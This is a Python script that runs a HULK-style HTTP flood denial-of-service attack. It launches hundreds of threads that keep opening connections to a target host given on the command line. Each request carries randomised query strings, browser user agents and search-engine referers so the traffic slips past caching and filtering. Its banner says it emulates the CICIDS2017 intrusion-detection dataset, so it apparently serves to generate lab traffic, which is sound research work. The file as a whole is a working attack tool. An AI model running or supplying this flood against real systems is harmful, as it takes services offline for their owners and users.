#!/usr/bin/env python3
import random
import string
import socket
import sys
from threading import Thread

target_ip = sys.argv[1]
target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
threads = int(sys.argv[3]) if len(sys.argv) > 3 else 500

user_agents = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
]

referers = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://search.yahoo.com/search?p=",
    "https://duckduckgo.com/?q="
]

def random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def hulk_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            
            random_param = random_string(random.randint(5, 10))
            random_value = random_string(random.randint(5, 15))
            user_agent = random.choice(user_agents)
            referer = random.choice(referers) + random_string(6)
            
            request = f"GET /?{random_param}={random_value} HTTP/1.1\r\n"
            request += f"Host: {target_ip}\r\n"
            request += f"User-Agent: {user_agent}\r\n"
            request += f"Referer: {referer}\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            request += "Accept-Language: en-US,en;q=0.5\r\n"
            request += "Accept-Encoding: gzip, deflate\r\n"
            request += "Connection: close\r\n"
            request += f"Cache-Control: max-age={random.randint(0, 10)}\r\n"
            request += "\r\n"
            
            s.send(request.encode())
            s.close()
        except:
            pass

if __name__ == '__main__':
    print(f"[*] DDoS Attack (CICIDS2017 emulation)")
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Threads: {threads}")
    print("[*] Starting attack...\n")
    
    for _ in range(threads):
        Thread(target=hulk_attack, daemon=True).start()
    
    input("Press ENTER to stop...\n")
